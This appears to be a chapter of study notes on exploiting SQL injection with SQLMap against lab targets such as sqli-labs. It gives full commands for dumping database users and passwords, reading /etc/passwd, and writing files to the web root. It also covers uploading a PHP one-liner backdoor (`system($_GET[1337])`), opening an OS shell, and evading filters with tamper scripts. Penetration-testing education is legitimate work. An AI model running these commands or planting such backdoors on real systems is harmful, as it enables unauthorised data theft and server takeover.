# Chapter 5: Exploiting SQL Injection

SQLMap contains a wide array of features some of which are the following:

- Support for **different kinds of SQL injection techniques** like:
    - Error-based injection
    - Blind injection
    - Time-based injection
    - Stacked queries
- **Acting as a database** client if appropriate credentials are provided
- **Downloading** and **uploading** files to the database server
- Ability to **explore** databases, tables, and columns individually
- Built-in support for cracking common hashes such as **MD5**
- Support for the **Metasploit** framework
- Code execution by exploiting DBMS features such as **xp_cmdshell**

---

# `Introduction to SQLMap`

Let me first demonstrate the first test bed—it takes a GET parameter named `id` and displays **username** and **password** values for the same. Let us see the following screenshot:

![image](https://user-images.githubusercontent.com/70459751/186283861-20b12d4f-baac-4def-8103-bc3ff6210b8c.png)

For 192.168.50.2/Less-1/?id=1 it displayed the value for the first user. If we change the number it will show for another user.

The most benign check for SQL injection is nothing other than adding a **quotation** mark (') after the suspect parameter.

After adding the quotation we get an MySQL error. We can use SQLMAP for testing on this parameter like that: 

`./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2)`

We can see from the following screenshot that the detailed output, consisting of **exploitation choices**, the payload used to test as well as the backend architecture of the web application:

![image](https://user-images.githubusercontent.com/70459751/186283938-fb3682e7-baea-412d-9868-776c1406b6c4.png)

# `Injection techniques`

The following table lets you walk through various options or a combination of them:
**B** Boolean-based blind or simply blind injection
**E** Error-based injection
**U** UNION-query based injection
**S** Stacked queries
**T** Time-based injection
**Q** Inline queries

By default SQLMAP uses the sutibale one of injection technique but it’s usefull to determine one for more easy work.

---

# `Dumping the data – in an error-based scenario`

`./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) --current-user`

![image](https://user-images.githubusercontent.com/70459751/186283972-2107b440-2f0a-4a4c-a2b6-445e8686ce59.png)

Now let us print the list of databases present using --dbs switch as follows:
`./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) --dbs`

![image](https://user-images.githubusercontent.com/70459751/186284276-b0c9fc65-2f43-4b07-905e-8af8a59985cc.png)

Can we dump security please!! 

`./sqlmap.py --technique=E -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) -D security --tables`
![image](https://user-images.githubusercontent.com/70459751/186284261-d49b9b72-96bd-4de5-a0eb-adb30c37a68b.png)

Lets dump the user table!!

`./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) -D security -T users --dump`

![image](https://user-images.githubusercontent.com/70459751/186284251-968d040a-2485-4813-b59f-3315e0607dfc.png)

First let us print the column names only, as follows:

`./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) -D security -T users --columns`

![image](https://user-images.githubusercontent.com/70459751/186284240-b645cbc0-9184-4527-bc74-1019fac642fd.png)

Lets dump the username and password only : 

`./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) -D security -T users -C "username, password" --dump`

![image](https://user-images.githubusercontent.com/70459751/186284225-588ae56c-dfa6-4100-a843-418573e73096.png)
---

# `Dump everything!`

`./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) --dump-all`

# `SQLMap and URL rewriting`

Let's assume the target is using rewritten URLs like the following:

[https://prakharprasad.com/books/1/view](https://prakharprasad.com/books/1/view)
[https://prakharprasad.com/books/2/view](https://prakharprasad.com/books/1/view)
[https://prakharprasad.com/books/3/view](https://prakharprasad.com/books/1/view)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6ff205c8-e389-40ea-804f-90a452824dc1/Untitled.png)

So with this technique we can clearly inject easily with websites using URL rewriting modules.

# `Speeding up the process!`

## `Multi-threading`

We can utilize the `--threads` switch and specify a value for the number of threads, which ranges from 1 to 10.

Let's try that out. First let's try to dump all the tables under the database security without the `--threads` option alongside the time Linux utility to track and monitor the `time`, as follows:

`time ./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) -D security --dump`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4ca9dd27-5fd5-469d-a6a2-d3bc6a5e0436/Untitled.png)

Now let's attempt to do the same with thread count of `three`, as follows:
`time ./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) -D security --dump --threads 3`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dd2b8034-ce49-43e8-b8c1-69e485fa8025/Untitled.png)

You can see that the running time `has decreased` with additional threads.

## `NULL connection`

The NULL connection is enabled by the `--null-connection` command-line switch.

The NULL connection option in SQLMap tries to exploit the injection without actually retrieving the full HTML body of the target;

## `HTTP persistent connections`

In case there is an overhead, this can be optimized by using the `--keep-alive` switch which uses the HTTP's persistent connection mechanism, and the exchange of data happens
over an already opened connection.

## `Basic optimization flags`

SQLMap provides an option to turn on some of the flags for performance
optimization by using the `-o` switch. These flags will be enabled as follows:
• `--keep-alive`
• `--null-connection`
• `--threads 3`

---

# `Dumping the data – in blind and time-based scenarios`

The major problem that we face when performing `blind and time-based exploitations` is the fact that there is no verbose database error, and if the query result is successful
(`true`) then the appropriate result is displayed `on the page, or a blank area` is displayed in the case that the result is `false`.

The scenario will be a `classic blind/time-based` injection with no error to facilitate us. If the query is `TRUE` then the web application throws the output as shown in the following screenshot:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/58361ef4-1e80-4047-9e2b-dc6f01ddb451/Untitled.png)

In the case that the query is FALSE then it throws the output as shown in the following screenshot:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a713b2c4-9cab-4540-8ccc-64e7aa5a4f74/Untitled.png)

If there is no error, then it is a `classic blind injection`.

Let's fire up SQLMap and try to exploit this injection as follows:

`./sqlmap.py -u [http://192.168.50.2/Less-8/?id=2](http://192.168.50.2/Less-8/?id=2)`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c07f6eee-0ff7-4811-81f1-a1541a657d8f/Untitled.png)

Let's see how much time it takes to dump the same table that we did earlier in the following `error-based` example:

`time ./sqlmap.py -u [http://192.168.50.2/Less-8/?id=2](http://192.168.50.2/Less-8/?id=2) -D security -T users --dump`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/589fc459-146c-4aba-9642-a7b238fbdef1/Untitled.png)

Now we can optimize the process using the previously mentioned `NULL connection` and the output prediction. By
using the `--null-connection` and the --predict-output we can significantly cut down the time as follows

`time ./sqlmap.py -u [http://192.168.50.2/Less-8/?id=2](http://192.168.50.2/Less-8/?id=2) -D security -T users --dump --predict-output`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9180512a-6777-497f-b626-ccb584f9dd20/Untitled.png)

---

# `Reading and writing files`

If there is an SQL injection and sufficient conditions (DB privileges, file permissions) are met then we can even upload a
backdoor shell or read/download server configurations or files whose locations are generally predefined:

![A simple web application architecture](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c1c60730-ee06-4889-8a92-2a68c2b2579d/Untitled.png)

A simple web application architecture

### `Checking privileges`

To get this we'll use the --privileges switch in SQLMap as follows:
`./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) --privileges`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6dd02e3d-e176-4d75-94ee-3727e7e16784/Untitled.png)

user has `FILE` privileges available, and we can utilize this to read/write files from the injection
if the file system permissions allow this; MySQL runs a separate user account to read/write files to the file system in Linux.

### `Reading files`

We'll use the --file-read switch in SQLMap followed by the full path of the file we want to download:
`./sqlmap.py -u [http://107.170.95.147/Less-1/?id=1](http://107.170.95.147/Less-1/?id=1) --file-read=/etc/passwd`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5071cd54-b483-4223-b5e1-d8412f82002c/Untitled.png)

### `Writing files`

For purposes of demonstration I've created a file locally at `/root/sqlmap-1.0/` packt with the content `hello world!` and will upload it to the target's /var/www/ packt.html folder as follows:
`/sqlmap.py -u [http://107.170.95.147/Less-1/?id=1](http://107.170.95.147/Less-1/?id=1) --file-write=/root/sqlmap-1.0/packt --file-dest=/var/www/packt.html`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33ba6204-37e1-4762-aaf7-9cc2cf3f8659/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e22045a8-fed1-43b4-90ec-eeec16e7bbd2/Untitled.png)

Sweet! The file is now live. Going one step ahead, let us upload a PHP one-liner backdoor shell through SQLMap as follows:
PHP one-liner shell: `<?php system($_GET[1337]); ?>`.
`/sqlmap.py -u [http://107.170.95.147/Less-1/?id=1](http://107.170.95.147/Less-1/?id=1) --file-write=shell.php --file-dest=/var/www/shell-php.php`

---

# `Handling injections in a POST request`

In the Username field we try to insert a stray character to break the query as we did before. Let's see what happens when inserting “ test’ “:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c813a91d-06af-4594-b744-a7f09352cfb9/Untitled.png)

If we check the HTTP request we can see the infected parameter:

![the affected parameter is uname](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/14273290-cf13-4f56-8ce6-3521eaf9a339/Untitled.png)

the affected parameter is uname

`./sqlmap.py -u [http://192.168.50.2/Less-11/](http://192.168.50.2/Less-11/) --data "uname=test&passwd=&submit=Submit" -p uname`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ab8bfe3d-dace-471d-8eed-c8ce1c2e81fc/Untitled.png)

-data switch to exploit this `POST-based` scenario

Another way of exploiting this is by `capturing the POST request` and manually specifying the parameter

`./sqlmap.py -r packt-demo-post.txt -p uname`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/062f2a7a-5509-42a2-b6f2-03b82cdaf285/Untitled.png)

---

# `SQL injection inside a login-based portal`

Example post-login URL: [http://admin.example.com/portal/names?id=1](http://admin.example.com/portal/names?id=1)

Using SQLMap (with cookies):  -cookie, which takes the `HTTP cookie as input`—here we can provide the session cookie for the user and then supply the injection through SQLMap

`./sqlmap.py --cookie="PHPSESSID=asafa76asfujaf8ajsfj26h6" –u "http://[admin.example.com/portal/names?id=1](http://admin.example.com/portal/names?id=1)"`

# `SQL shell`

The SQL shell basically invokes the `built-in SQL interactive` interpreter and it is presented in such a way that it feels like interacting with a database SQL utility.

Let's check this out as follows:
`./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) --sql-shell`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/34766bd8-fd45-4af5-95cd-cdb999bce2e1/Untitled.png)

Since typically most SQL injection issues are based on `SELECT` queries, the SQL shell might not work with other type of options like
`INSERT`, `UPDATE` and so on, unless there is a suitable type of injection available such as the stacked query.

---

# `Command shell`

Let's try this out as follows:
`./sqlmap.py -u [http://107.170.95.147/Less-1/?id=1](http://107.170.95.147/Less-1/?id=1) --os-shell`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d61c4182-f068-475a-a773-dfe866e172a7/Untitled.png)

`./sqlmap.py -u [http://107.170.95.147/Less-1/?id=1](http://107.170.95.147/Less-1/?id=1) --os-cmd "uname -a"`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1994f3d6-7474-48b0-980c-14ec68d833ab/Untitled.png)

---

# `Evasion – tamper scripts`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/df9a8429-dc88-4e6e-9bb2-1b099621b76a/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2ca81d0b-6678-48c7-a964-85ef098dcdbc/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7f750e75-272b-4bbf-9029-2c80a38bab6a/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fda16179-4c62-4344-9378-df8dea827cb9/Untitled.png)

Now let's try and run one of the scripts called [charencode.py](http://charencode.py/), which replaces empty spaces with a + sign.

`./sqlmap.py -u [http://192.168.50.2/Less-1/?id=2](http://192.168.50.2/Less-1/?id=2) --tamper charencode -v3`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7e94a843-de8e-41e7-8542-63b94e14a9e7/Untitled.png)

---

# `Configuring with proxies`

SQLMap provides the --proxy switch to pass a URL of an HTTP(s) proxy. Let try to understand this.

A valid proxy is in the form of [http://url](http://url/):port. Assuming our proxy is at [https://proxy.example.com:8080](https://proxy.example.com:8080/) we use the --proxy switch as follows:
`./sqlmap.py --proxy="[https://proxy.example.com:8080](https://proxy.example.com:8080/)" -u "[http://vuln](http://vuln/).com/?id=1`

---

# `Summary`

This chapter covered different ways in which we can utilize SQLMap to exploit the SQL injection flaws. SQL injection is a critical issue from a security standpoint and
most breaches and data leaks we see today are as a result of this. For additional reading I'd like to suggest a book called **SQL Injection Attacks and Defense** by
Justin Clarke and a comprehensive video series by Audi-1 himself, available at [`http://www.securitytube.net/user/Audi`](http://www.securitytube.net/user/Audi).
SQLMap has some awesome switches like --levels and --risks which can be looked up; these provide SQLMap additional tests to perform while looking
for injection points; some switches are more elite, like the --os-pwn which grants an immediate Meterpreter shell of Metasploit. Please do read their official
documentation in which the entire set of the SQLMap switch has been mentioned; it's available here:
[`https://github.com/sqlmapproject/sqlmap/wiki/Usage`](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
Metasploit is covered in Chapter 7, Metasploit and Web and I hope the reader will messaround with this switch after getting familiar with Metasploit.
For a more manual approach to exploiting SQL injection in MySQL systems (errorbased) I'd recommend readers visit one of my previous posts which can be found
here: [https://prakharprasad.com/introduction-to-sql-injection-and](https://prakharprasad.com/introduction-to-sql-injection-and)exploitation-mysql-5-error-based/.
The next chapter will deal with security vulnerabilities that occur in file upload functionality, a very common part of web application these days.
